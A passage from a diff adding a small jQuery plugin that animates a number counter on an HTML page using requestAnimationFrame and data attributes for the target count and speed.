+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
